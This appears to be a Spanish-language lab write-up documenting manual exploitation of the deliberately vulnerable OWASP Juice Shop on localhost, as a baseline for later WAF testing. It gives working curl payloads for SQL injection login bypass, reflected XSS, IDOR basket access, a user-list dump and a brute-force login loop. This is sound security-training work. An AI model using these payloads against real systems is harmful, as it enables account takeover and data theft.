# Fase 1 — Reconocimiento de la aplicación vulnerable

## Objetivo

Identificar y explotar manualmente las vulnerabilidades presentes en OWASP Juice Shop accediendo directamente al puerto 3000 (sin WAF), documentar cada hallazgo con su categoría OWASP Top 10 2021, el endpoint afectado y la evidencia del ataque exitoso.

## Desarrollo

Todas las pruebas se realizaron contra `http://localhost:3000` para observar el comportamiento sin ninguna capa de protección.

### 1. SQLi en Login — A03:2021 Injection

**Endpoint:** `POST /rest/user/login`

La aplicación construye la consulta SQL concatenando directamente la entrada del usuario. La lógica vulnerable equivale a:

```sql
SELECT user, password FROM users WHERE username='[input]' AND password='[input]';
```

**Payload utilizado:**
```bash
curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"cualquiera"}'
```

La consulta resultante es:
```sql
SELECT user, password FROM users WHERE username='' OR 1=1-- AND password='cualquiera';
```

El `OR 1=1` siempre es verdadero y el `--` comenta el resto, devolviendo el primer usuario (administrador). La respuesta HTTP fue `200 OK` con token JWT válido para `admin@juice-sh.op`.

---

### 2. XSS Reflejado en búsqueda — A03:2021 Injection

**Endpoint:** `GET /rest/products/search?q=`

El parámetro `q` se incluye en la respuesta sin sanitización. El payload se inyecta en el campo de búsqueda de la interfaz web:

```
http://localhost:3000/#/search?q=<iframe src="javascript:alert('XSS')">
```

También verificado vía curl:

```bash
curl -s "http://localhost:3000/rest/products/search?q=<script>alert(1)</script>" | grep -o "script"
```

La respuesta devuelve el payload sin escapar, confirmando la vulnerabilidad. Un atacante real podría robar cookies de sesión o redirigir al usuario.

---

### 3. IDOR en Pedidos — A01:2021 Broken Access Control

**Endpoint:** `GET /rest/basket/{id}`

Autenticado como un usuario ordinario, es posible acceder a cestas de compra de otros usuarios simplemente cambiando el `{id}` en la URL:

```bash
# Primero se obtiene token de un usuario normal
TOKEN=$(curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test"}' | jq -r '.authentication.token')

# Acceso a la cesta del usuario 1 (administrador)
curl -s http://localhost:3000/rest/basket/1 \
  -H "Authorization: Bearer $TOKEN"
# HTTP 200 — devuelve datos de otra cuenta
```

El servidor no verifica que el `id` de la cesta corresponda al usuario autenticado.

---

### 4. API no documentada expuesta — A05:2021 Security Misconfiguration

**Endpoints:** `GET /api-docs` y `GET /api/Users`

```bash
curl -s http://localhost:3000/api-docs | python3 -m json.tool | head -20
```

La aplicación expone una especificación Swagger completa que lista todos los endpoints internos. Además:

```bash
curl -s http://localhost:3000/api/Users \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

Devuelve el listado completo de usuarios con emails y hashes de contraseña. Estas rutas deberían estar restringidas o eliminadas en producción.

---

### 5. Fuerza bruta en Login — A07:2021 Authentication Failures

**Endpoint:** `POST /rest/user/login`

La aplicación no implementa limitación de intentos ni CAPTCHA. Se simuló una ráfaga de 20 intentos:

```bash
for i in $(seq 1 20); do
  curl -s -X POST http://localhost:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"intento$i\"}" \
    -o /dev/null -w "Intento $i: %{http_code}\n"
done
```

Los 20 intentos devuelven `401` sin ningún mecanismo de bloqueo temporal ni alerta. Un diccionario real (como `rockyou.txt`) podría comprometer la cuenta.

## Evidencias

### Tabla de vulnerabilidades encontradas

| # | Vulnerabilidad | OWASP Top 10 2021 | Endpoint | Resultado |
|---|---|---|---|---|
| 1 | SQL Injection en login | A03 – Injection | `POST /rest/user/login` | Acceso como admin (`200 OK` + JWT) |
| 2 | XSS reflejado en búsqueda | A03 – Injection | `GET /rest/products/search?q=` | Script ejecutado / reflejado |
| 3 | IDOR en pedidos | A01 – Broken Access Control | `GET /rest/basket/{id}` | Acceso a canasta ajena (`200 OK`) |
| 4 | API no documentada expuesta | A05 – Security Misconfiguration | `GET /api-docs`, `/api/Users` | Swagger + dump de usuarios |
| 5 | Fuerza bruta sin límite | A07 – Auth Failures | `POST /rest/user/login` | 20 intentos sin bloqueo |

### Verificación: acceso directo vs. proxy

En esta fase todas las pruebas van contra `localhost:3000`. El puerto `4000` (WAAP) está en `DetectionOnly` — no bloquea, solo registra. El contraste con el comportamiento del WAF se documenta en la Fase 2.

## Entregable

Tabla de cinco vulnerabilidades con:
- Nombre de la vulnerabilidad
- Categoría OWASP Top 10 2021 correspondiente
- Endpoint afectado
- Evidencia de explotación exitosa (comandos curl y resultado HTTP)

## Conclusión de la fase

OWASP Juice Shop expone vulnerabilidades críticas en todas las categorías del OWASP Top 10 2021 trabajadas, sin ningún mecanismo de defensa activo. La ausencia de validación de entrada (SQLi, XSS), control de acceso (IDOR) y rate limiting (fuerza bruta) demuestra el escenario típico de una aplicación web insegura, que sirve como línea base para medir la efectividad de las capas de protección implementadas en las fases siguientes.
